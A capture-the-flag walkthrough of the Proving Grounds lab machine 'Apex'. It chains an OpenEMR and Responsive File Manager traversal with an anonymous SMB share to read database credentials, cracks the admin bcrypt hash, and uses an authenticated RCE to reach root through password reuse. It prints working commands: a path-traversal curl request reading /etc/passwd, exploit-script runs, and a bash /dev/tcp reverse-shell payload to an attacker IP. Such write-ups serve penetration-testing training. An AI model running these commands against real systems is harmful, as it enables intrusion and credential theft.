---
machine: Apex
platform: Proving Grounds
category: Linux
difficulty: Insane
tags: [openemr, unauthenticated-copy-paste-lfi, anonymous-smb, file-manager-traversal, hash-cracking, credential-reuse]
date: 2026-09-06
status: retired
summary: A Linux box running an OpenEMR medical-records portal alongside a vulnerable file manager — testing chained exploitation of a file-manager directory-traversal bug (using a writable anonymous SMB share as a read-back channel) to steal database credentials, offline hash cracking for an authenticated RCE, and root password reuse for the path to root.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/pg/apex]
└─$ nmap-full target         
[*] Running fast port discovery on target...
[sudo] password for kali: 
[*] Open ports: 80,445,3306
[*] Running full scan on target...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-06 18:48 -0400
Nmap scan report for target (192.168.131.145)
Host is up (0.057s latency).

PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: APEX Hospital
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql       MariaDB 5.5.5-10.1.48
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
|   Thread ID: 32
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, ConnectWithDatabase, SupportsCompression, DontAllowDatabaseTableColumn, ODBCClient, InteractiveClient, SupportsTransactions, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, LongPassword, Speaks41ProtocolNew, SupportsLoadDataLocal, Speaks41ProtocolOld, LongColumnFlag, FoundRows, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: a1lP*!e\ztU-|PWF7~;H
|_  Auth Plugin Name: mysql_native_password
Service Info: Host: APEX

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: apex
|   NetBIOS computer name: APEX\x00
|   Domain name: \x00
|   FQDN: apex
|_  System time: 2026-09-06T18:48:46-04:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-09-06T22:48:45
|_  start_date: N/A
|_clock-skew: mean: 1h20m07s, deviation: 2h18m35s, median: 6s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.26 seconds
[*] Checking if UDP/SNMP is up on target...
[!] Invalid IP address!
```

On the webapp we see some names:

```text
Walter White
William Anderson
Amanda Jepson
Sarah Jhonson
wwalter@apex.offsec
awilliam@apex.offsec
jsarah@apex.offsec
jamanda@apex.offsec
```

We can feroxbust and find some interesting files:

```text
http://apex/source/Documents/OpenEMR%20Features.pdf
```

After opening up the pdf we see its documentation for a software called OpenEMR. I search it in searchsploit and then navigate to `http://apex/openemr` to check if its running on the webapp and am redirected to a login page.

If we look up how to find the version number unauthenticated we see that /admin.php leaks the version number often:

```text
http://apex/openemr/admin.php
```

![OpenEMR admin.php page leaking the site's DB name and version 5.0.1 (1) without authentication](/media/Pasted%20image%2020260906181421.png)

This shows that we are on version 5.0.1 (1) and the database name is openemr

We can read the SMB share as guest and find that we have read access to the docs share:

```bash
┌──(kali㉿kali)-[~/pg/apex]
└─$ nxc smb apex -u '' -p '' --shares
SMB         192.168.131.145 445    APEX             [*] Unix - Samba (name:APEX) (domain:) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         192.168.131.145 445    APEX             [+] \: (Guest)
SMB         192.168.131.145 445    APEX             [*] Enumerated shares
SMB         192.168.131.145 445    APEX             Share           Permissions     Remark
SMB         192.168.131.145 445    APEX             -----           -----------     ------
SMB         192.168.131.145 445    APEX             print$                          Printer Drivers
SMB         192.168.131.145 445    APEX             docs            READ            Documents
SMB         192.168.131.145 445    APEX             IPC$                            IPC Service (APEX server (Samba, Ubuntu))
```

```text
# ls
drw-rw-rw-          0  Fri Apr  9 11:47:11 2021 .
drw-rw-rw-          0  Fri Apr  9 11:47:11 2021 ..
-rw-rw-rw-     290738  Fri Apr  9 11:47:11 2021 OpenEMR Success Stories.pdf
-rw-rw-rw-     490355  Fri Apr  9 11:47:11 2021 OpenEMR Features.pdf
# get OpenEMR Success Stories.pdf
# get OpenEMR Features.pdf
# exit
```

Nothing of use there.

## Foothold

We can attempt the auth bypass involving letting us access these purported endpoints:

```text
An attacker can bypass authentication to access sensitive files and tools, including:

- portal/account/register.php

- `portal/get_allergies.php`

- `portal/get_medications.php`

- `portal/get_lab_results.php`

- `portal/get_patient_documents.php`

- `portal/messaging/messages.php`

- `portal/find_appt_popup_user.php`
```

We can access this: `http://apex/openemr/portal/messaging/messages.php`

![OpenEMR Patient Messaging portal reached unauthenticated, showing an empty Inbox](/media/Pasted%20image%2020260906185259.png)

We cannot view the mail but we can write an email to the Administrator, however, it appears to get instantly reset.

We can access: `http://apex/openemr/portal/find_appt_popup_user.php?providerid=&catid=`

We can seemingly only access the pages in /portal/messaging as we are also able to reach this secure messaging portal as portal-user

![OpenEMR secure_chat.php reached as portal-user, showing an active chat with Administrator](/media/Pasted%20image%2020260906190440.png)

If we re-feroxbust `http://apex` we can find `http://apex/filemanager/`

If we navigate to the top right we see a question mark icon that discloses we are running: `RESPONSIVE filemanager v.9.13.4`

We can searchsploit this and we find a directory traversal vulnerability:

```text
https://www.exploit-db.com/exploits/45987
```

Or we can use:

```bash
┌──(kali㉿kali)-[~/pg/apex]
└─$ curl -X POST -d "path=../../../../../../../etc/passwd" -H "Cookie: PHPSESSID=pjdir96fusvp1tnbvt9vtcc73k" "http://apex/filemanager/ajax_calls.php?action=get_file&sub_action=edit&preview_mode=text"
```

We are unable to read .php files from within filemanager, so we need to find a different way to attempt to read `sqlconf.php` or `config.php` to gain credentials to the database.

We return to the python exploit using ajax_calls copy and paste

```bash
┌──(kali㉿kali)-[~/pg/apex]
└─$ python3 49359.py http://apex pjdir96fusvp1tnbvt9vtcc73k /etc/passwd
[*] Copy Clipboard
[*] Paste Clipboard
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false
white:x:1000:1000::/home/white:/bin/sh
```

Interestingly if we reopen the docs share of smb we find the files we created while poking around in the file manager. This means that the smb share is hosted on `/var/www/filemanager`

```bash
┌──(kali㉿kali)-[~/pg/apex]
└─$ impacket-smbclient guest:''@192.168.131.145                   
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
Type help for list of commands
# shares
print$
docs
IPC$
# use docs
# ls
drw-rw-rw-          0  Sun Sep  6 20:13:20 2026 .
drw-rw-rw-          0  Sun Sep  6 21:04:03 2026 ..
-rw-rw-rw-          4  Sun Sep  6 20:11:14 2026 asdf.txt.txt
-rw-rw-rw-     290738  Fri Apr  9 11:47:11 2021 OpenEMR Success Stories.pdf
-rw-rw-rw-          5  Sun Sep  6 20:12:20 2026 AOD3O4~8
-rw-rw-rw-         30  Sun Sep  6 20:12:50 2026 CRVZ4W~L
-rw-rw-rw-     490355  Fri Apr  9 11:47:11 2021 OpenEMR Features.pdf
```

Our exploit functions by copying the file to a writable directory (specified in the path) and then reading it from that copy.

We can modify the `path=` to point at Documents where our SMB share is mounted and then get it down from there:

```text
#line to modify
	url_paste, data="path=/Documents", headers=headers)
```

We copy the sqlconf file and get it down from the smb share:

```bash
┌──(kali㉿kali)-[~/pg/apex]
└─$ python3 49359.py http://apex:80 PHPSESSID=pjdir96fusvp1tnbvt9vtcc73k /var/www/openemr/sites/default/sqlconf.php
[*] Copy Clipboard
[*] Paste Clipboard
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at apex Port 80</address>
</body></html>

┌──(kali㉿kali)-[~/pg/apex]
└─$ impacket-smbclient guest:''@192.168.131.145
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
Type help for list of commands
# use docs
# ls
drw-rw-rw-          0  Sun Sep  6 23:53:47 2026 .
drw-rw-rw-          0  Sun Sep  6 23:49:43 2026 ..
-rw-rw-rw-       1607  Sun Sep  6 23:49:22 2026 passwd
-rw-rw-rw-        639  Sun Sep  6 23:53:47 2026 sqlconf.php
-rw-rw-rw-     290738  Fri Apr  9 11:47:11 2021 OpenEMR Success Stories.pdf
-rw-rw-rw-     490355  Fri Apr  9 11:47:11 2021 OpenEMR Features.pdf
# 
```

```bash
┌──(kali㉿kali)-[~/pg/apex]
└─$ cat sqlconf.php         
<?php
//  OpenEMR
//  MySQL Config

$host   = 'localhost';
$port   = '3306';
$login  = 'openemr';
$pass   = 'C78maEQUIEuQ';
$dbase  = 'openemr';

//Added ability to disable
//utf8 encoding - bm 05-2009
global $disable_utf8_flag;
$disable_utf8_flag = false;

$sqlconf = array();
global $sqlconf;
$sqlconf["host"]= $host;
$sqlconf["port"] = $port;
$sqlconf["login"] = $login;
$sqlconf["pass"] = $pass;
$sqlconf["dbase"] = $dbase;
//////////////////////////
//////////////////////////
//////////////////////////
//////DO NOT TOUCH THIS///
$config = 1; /////////////
//////////////////////////
//////////////////////////
//////////////////////////
?>
```

We can connect to the `openemr` database:

```bash
┌──(kali㉿kali)-[~/pg/apex]
└─$ mysql -u 'openemr' -p'C78maEQUIEuQ' -h 192.168.131.145 --skip-ssl-verify-server-cert
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 31
Server version: 10.1.48-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

Inside `users_secure` table we find a hash for user admin:

```bash
MariaDB [openemr]> select * from users_secure;
+----+----------+--------------------------------------------------------------+--------------------------------+---------------------+-------------------+---------------+-------------------+---------------+
| id | username | password                                                     | salt                           | last_update         | password_history1 | salt_history1 | password_history2 | salt_history2 |
+----+----------+--------------------------------------------------------------+--------------------------------+---------------------+-------------------+---------------+-------------------+---------------+
|  1 | admin    | $2a$05$bJcIfCBjN5Fuh0K9qfoe0eRJqMdM49sWvuSGqv84VMMAkLgkK8XnC | $2a$05$bJcIfCBjN5Fuh0K9qfoe0n$ | 2021-05-17 10:56:27 | NULL              | NULL          | NULL              | NULL          |
+----+----------+--------------------------------------------------------------+--------------------------------+---------------------+-------------------+---------------+-------------------+---------------+
1 row in set (0.059 sec)
```

We can crack this bcrypt hash with hashcat:

```bash
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt

$2a$05$bJcIfCBjN5Fuh0K9qfoe0eRJqMdM49sWvuSGqv84VMMAkLgkK8XnC:thedoctor
```

This means we have `openemr` creds for `admin:thedoctor`.

We can now look through our `searchsploit` RCE options for an authenticated RCE exploit for our version of openemr:

```bash
┌──(kali㉿kali)-[~/pg/apex]
└─$ searchsploit openemr 5.0.1          
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenEMR 5.0.1 - 'controller' Remote Code Execution                                                                        | php/webapps/48623.txt
OpenEMR 5.0.1 - Remote Code Execution (1)                                                                                 | php/webapps/48515.py
OpenEMR 5.0.1 - Remote Code Execution (Authenticated) (2)                                                                 | php/webapps/49486.rb
OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)                                               | php/webapps/49998.py
OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated) (2)                                           | php/webapps/50122.rb
OpenEMR 5.0.1.3 - (Authenticated) Arbitrary File Actions                                                                  | linux/webapps/45202.txt
OpenEMR 5.0.1.3 - Authentication Bypass                                                                                   | php/webapps/50017.py
OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)                                                                   | php/webapps/45161.py
OpenEMR 5.0.1.7 - 'fileName' Path Traversal (Authenticated)                                                               | php/webapps/50037.py
OpenEMR 5.0.1.7 - 'fileName' Path Traversal (Authenticated) (2)                                                           | php/webapps/50087.rb
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

When we navigate to the portal directory we find the following:

```text
http://192.168.131.145/openemr/portal/

Patient Portal is turned off
```

We can go auth to the portal and enable it in the GUI.

We can then use the 5.0.1.3 Auth RCE to establish a reverse shell to the box:

```bash
┌──(kali㉿kali)-[~/pg/apex]
└─$ python2 45161.py http://192.168.131.145/openemr -u admin -p thedoctor -c 'bash -i >& /dev/tcp/192.168.45.177/80 0>&1'
 .---.  ,---.  ,---.  .-. .-.,---.          ,---.    
/ .-. ) | .-.\ | .-'  |  \| || .-'  |\    /|| .-.\   
| | |(_)| |-' )| `-.  |   | || `-.  |(\  / || `-'/   
| | | | | |--' | .-'  | |\  || .-'  (_)\/  ||   (    
\ `-' / | |    |  `--.| | |)||  `--.| \  / || |\ \   
 )---'  /(     /( __.'/(  (_)/( __.'| |\/| ||_| \)\  
(_)    (__)   (__)   (__)   (__)    '-'  '-'    (__) 
                                                       
   ={   P R O J E C T    I N S E C U R I T Y   }=    
                                                       
         Twitter : @Insecurity                       
         Site    : insecurity.sh                     

[$] Authenticating with admin:thedoctor
[$] Injecting payload

┌──(kali㉿kali)-[~/pg/apex]
└─$ sudo penelope -p 80 

www-data@APEX:/var/www/openemr/interface/main$ whoami
www-data
```

We can read the local.txt flag from `/home/white`

## Privilege Escalation

After reading a scarce `linpeas` output and searching for creds we attempt password reuse of `thedoctor` on root and it works!

```bash
www-data@APEX:/var/www$ su root
Password: 
root@APEX:/var/www# whoami
root
```

We can read the `proof.txt` from `/root` and the box is compromised!
